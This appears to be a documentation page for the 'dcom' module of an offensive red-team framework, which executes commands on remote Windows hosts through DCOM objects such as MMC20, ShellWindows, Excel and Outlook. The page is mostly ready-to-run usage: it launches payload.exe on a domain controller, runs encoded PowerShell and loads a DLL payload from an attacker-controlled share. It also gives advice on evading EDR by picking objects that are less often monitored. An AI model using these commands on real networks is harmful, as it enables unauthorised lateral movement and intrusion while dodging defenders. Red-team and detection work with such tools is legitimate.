+++
title = "dcom"
chapter = false
weight = 110
hidden = false
+++

## Summary

Execute commands on remote hosts via DCOM (Distributed Component Object Model) lateral movement. Creates COM objects on remote machines using `CoCreateInstanceEx` and invokes shell execution methods. Six DCOM objects supported: MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell, Excel.Application, and Outlook.Application.

{{% notice info %}}Windows Only{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | exec | Action: `exec` |
| host | Yes | - | Target hostname or IP address |
| object | No | mmc20 | DCOM object: `mmc20`, `shellwindows`, `shellbrowser`, `wscript`, `excel`, `outlook` |
| command | Yes | - | Command or program to execute |
| args | No | - | Arguments to pass to the command |
| dir | No | C:\Windows\System32 | Working directory on the target |
| username | No | - | Username for DCOM auth (uses make-token creds if not specified) |
| password | No | - | Password for DCOM auth (uses make-token creds if not specified) |
| domain | No | - | Domain for DCOM auth (uses make-token creds if not specified) |

## Usage

### With make-token (Recommended Workflow)
```
make-token -domain north.sevenkingdoms.local -username eddard.stark -password FightP3aceAndHonor!
dcom -action exec -host 192.168.1.50 -command "cmd.exe" -args "/c whoami > C:\temp\out.txt"
```
Credentials from `make-token` are automatically used for DCOM authentication.

### With Explicit Credentials
```
dcom -action exec -host 192.168.1.50 -command "cmd.exe" -args "/c whoami > C:\temp\out.txt" -domain CORP -username admin -password P@ssw0rd
```
Explicit credentials override make-token credentials.

### Execute via MMC20.Application (Most Reliable)
```
dcom -action exec -host DC01 -object mmc20 -command "C:\Users\Public\payload.exe"
```
Uses `Document.ActiveView.ExecuteShellCommand`.

### Execute via ShellWindows
```
dcom -action exec -host 192.168.1.50 -object shellwindows -command "cmd.exe" -args "/c ipconfig > C:\temp\net.txt"
```
Requires `explorer.exe` to be running on the target. Uses `Item().Document.Application.ShellExecute`.

### Execute via ShellBrowserWindow
```
dcom -action exec -host 192.168.1.50 -object shellbrowser -command "powershell.exe" -args "-enc <base64>"
```
Less reliable on modern Windows. Uses `Document.Application.ShellExecute`.

### Execute via WScript.Shell
```
dcom -action exec -host 192.168.1.50 -object wscript -command "cmd.exe /c whoami > C:\temp\out.txt"
```
Good fallback when MMC/Shell objects are blocked. Uses `WScript.Shell.Run`. Less commonly monitored by EDR.

### Execute via Excel.Application (DDEInitiate)
```
dcom -action exec -host 192.168.1.50 -object excel -command "whoami" -args "> C:\temp\out.txt"
```
Executes commands via DDE channel through Excel. Requires Excel installed on target.

### Load DLL via Excel.Application (RegisterXLL)
```
dcom -action exec -host 192.168.1.50 -object excel -command "\\\\attacker\\share\\payload.xll"
```
Loads a DLL/XLL into the Excel.exe process on the target. Stealthier — payload lives inside the Office process. Command must end in `.xll` or `.dll` to trigger RegisterXLL mode.

### Execute via Outlook.Application
```
dcom -action exec -host 192.168.1.50 -object outlook -command "cmd.exe" -args "/c whoami > C:\temp\out.txt"
```
Uses `Outlook.Application.CreateObject("Wscript.Shell").Run`. Command executes inside `OUTLOOK.EXE` process context. Unusual vector — EDR tools typically don't monitor Outlook for shell execution. Requires Outlook installed on target. May be blocked by Outlook's programmatic access security settings.

## Example Output

### Successful Execution
```
DCOM MMC20.Application executed on 192.168.100.52:
  Command: cmd.exe
  Args: /c whoami > C:\Windows\Temp\dcom_test.txt
  Directory: C:\Windows\System32
  Method: Document.ActiveView.ExecuteShellCommand
  Auth: north.sevenkingdoms.local\eddard.stark (explicit)
```

### No Credentials Available
```
Failed to create MMC20.Application on 192.168.1.50: CoCreateInstanceEx failed: HRESULT 0x80070005
  Hint: Use make-token first or provide -username/-password/-domain params
```

## Operational Notes

- **Authentication**: DCOM requires explicit credentials for remote COM activation. Use either:
  1. `make-token` first — credentials are stored and automatically used by DCOM
  2. Explicit `-username`/`-password`/`-domain` parameters on the DCOM command
  - **Note**: Unlike SCM (psexec) or other Windows APIs, DCOM does not inherit the thread's impersonation token for remote calls. This is why explicit credential passing is required.
- **No output capture**: DCOM execution is fire-and-forget — commands run on the target but output is not returned. Redirect output to a file and retrieve it via `smb` or `cat`.
- **DCOM must be enabled**: The target must have DCOM enabled (default on Windows). Firewall must allow RPC traffic (TCP 135 + dynamic ports).
- **Admin required**: DCOM execution requires local administrator privileges on the target host.
- **Object selection**:
  - `mmc20`: Most reliable, works on all modern Windows versions. Most detected by EDR.
  - `shellwindows`: Requires an interactive explorer.exe session
  - `shellbrowser`: May not work on Windows 10+ (CLSID restricted in newer versions)
  - `wscript`: WScript.Shell.Run — less commonly monitored, good fallback when MMC is blocked
  - `excel`: Requires Excel installed. Two modes: commands → DDEInitiate, .dll/.xll files → RegisterXLL (payload lives in Excel process)
  - `outlook`: Requires Outlook installed. Uses CreateObject("Wscript.Shell") inside Outlook — command runs within OUTLOOK.EXE. Often not monitored by EDR. May be blocked by Outlook's programmatic access security settings.
- **Opsec**: DCOM execution creates processes on the target under the authenticated user's context. Event ID 4624 (logon type 3) will be generated. Process creation events (4688) will show the executed command.

## Common HRESULT Errors

| HRESULT | Meaning |
|---------|---------|
| 0x800706BA | RPC server unavailable (host unreachable, firewall, or DCOM disabled) |
| 0x80070005 | Access denied (insufficient privileges or DCOM launch permissions) |
| 0x80004005 | Unspecified error (CLSID not registered or blocked on target) |
| 0x800706BE | Remote procedure call failed |

## MITRE ATT&CK Mapping

- **T1021.003** — Remote Services: Distributed Component Object Model
